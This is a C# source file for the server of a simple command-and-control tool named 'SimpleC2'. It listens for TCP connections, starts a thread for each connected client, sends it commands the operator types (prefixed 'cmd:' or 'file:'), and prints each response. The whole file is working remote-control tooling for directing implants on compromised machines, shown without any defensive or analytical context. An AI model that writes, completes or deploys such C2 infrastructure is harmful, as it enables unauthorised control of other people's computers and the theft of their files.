using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SimpleC2.Server
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Server started...");
            TcpListener listener = new TcpListener(IPAddress.Any, Settings.ServerPort);
            listener.Start();
            Console.WriteLine("Waiting for clients...");

            while (true)
            {
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("Client connected.");
                Thread clientThread = new Thread(() => HandleClient(client));
                clientThread.Start();
            }
        }

        private static void HandleClient(TcpClient client)
        {
            NetworkStream stream = client.GetStream();
            while (true)
            {
                Console.Write("Enter command (cmd:<command> or file:<command>): ");
                string command = Console.ReadLine();
                byte[] data = Encoding.UTF8.GetBytes(command);
                stream.Write(data, 0, data.Length);

                byte[] buffer = new byte[4096];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                Console.WriteLine($"Response: {response}");
            }
        }
    }
}